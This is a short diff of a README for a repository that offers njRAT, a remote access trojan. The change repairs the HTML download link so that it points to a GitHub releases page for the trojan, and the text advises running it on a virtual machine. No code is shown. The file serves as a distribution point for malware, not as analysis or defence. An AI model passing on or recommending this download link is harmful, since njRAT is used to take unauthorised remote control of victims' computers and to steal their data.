@@ -1,7 +1,7 @@
 # njRAT
 <center> 
   NjRAT is a Remote Administration Trojan.
-  <a href=https://github.com/st2o1/NjRATs](https://github.com/st2o1/NjRATs/releases/tag/njRAT> Download njRAT </a>
+  <a href=https://github.com/st2o1/NjRATs/releases/tag/njRAT> Download njRAT </a>
 </center>
 
 # Please Use this repository on a Virtual Machine.
